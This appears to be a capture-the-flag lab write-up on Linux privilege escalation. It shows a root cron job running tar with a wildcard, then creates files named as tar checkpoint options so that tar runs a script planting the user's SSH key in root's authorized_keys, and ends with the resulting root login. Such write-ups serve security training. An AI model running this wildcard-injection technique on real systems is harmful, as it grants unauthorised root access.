---
layout: default
title: Bash Gobbling (Tar *)
parent: Cron
nav_order: 1
---

# Bash Gobbling (Tar \*)

---

## Check Cron Jobs

```bash
[alfredo@fedora ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh

```

Check the _/usr/local/bin/backup-flask.sh_ job that is running every minute.

```bash
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

```

This job is running _tar_ with the astrisk.

This allows for an exploitation technique known as _Bash Gobbling_

Let's create a malicious script that copies the _/home/alfredo/.ssh/authorized_keys_ to \*/root/.ssh/authorized_keys"

```bash
[alfredo@fedora ~]$ cd restapi
[alfredo@fedora restapi]$ echo '#!/bin/bash' >> getroot.sh
[alfredo@fedora restapi]$ echo 'cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys' >> getroot.sh
[alfredo@fedora restapi]$ cat getroot.sh#!/bin/bash
cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys
```

Now we can tamper with the backup process:

```bash
[alfredo@fedora restapi]$ touch ./--checkpoint=1 ./--checkpoint-action=exec=getroot.sh
```

Wait a few minutes for the cronjob to execute and then SSH into the system as the root user.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ ssh -p 25022 -i id_alfredo root@192.168.213.249
Web console: https://fedora:9090/

Last login: Tue Mar 28 03:21:22 2023
[root@fedora ~]# id
uid=0(root) gid=0(root) groups=0(root)

```
